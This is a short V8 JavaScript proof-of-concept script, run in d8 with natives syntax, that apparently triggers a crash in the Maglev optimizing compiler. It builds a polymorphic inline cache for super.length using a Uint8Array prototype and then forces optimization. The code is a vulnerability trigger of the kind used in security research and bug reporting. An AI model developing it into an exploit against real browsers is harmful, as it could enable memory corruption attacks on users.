const obj = {
    func(prepare, optimize) {
        const arrowFunc = () => {
            /**
             *  The 'super' in an arrow function inherits from the outer scope, same as the 'super' in `func`
             *  'super' points to the object the function belongs to, `func` belongs to `obj`, therefore 'super' points to `obj`
             */
            return super.length;
        };

        if(prepare) {
            %PrepareFunctionForOptimization(arrowFunc);
        }
        if(optimize) {
            %OptimizeMaglevOnNextCall(arrowFunc);
        }

        return arrowFunc();
    }
};

/**
 *  Create polymorphic IC for super.length
 */
try {
    /**
     *  'super' points to obj, obj.__proto__ = Object.prototype
     *  Therefore, a monomorphic IC will be added to the Feedback Slot of super.length, with key as Object.prototype.map
     */
    obj.func(true, false);
} catch (e) {
    print(e);
}

const u8Arr = new Uint8Array(20);
obj.__proto__ = u8Arr;
try {
    /**
     *  'super' points to obj, obj.__proto__ = u8Arr
     *  Although super.length will throw a js exception due to TypedArrayPrototypeLength and execution fails,
     *  an IC will still be added, becoming a polymorphic IC, containing two keys:
     *      1. map of Object.prototype
     *      2. map of u8Arr
     */
    obj.func(true, false);
} catch (e) {
    print(e);
}

// Triggering crash through Maglev optimization
print(obj.func(false, true));
//./d8 \--allow-natives-syntax \./poc.js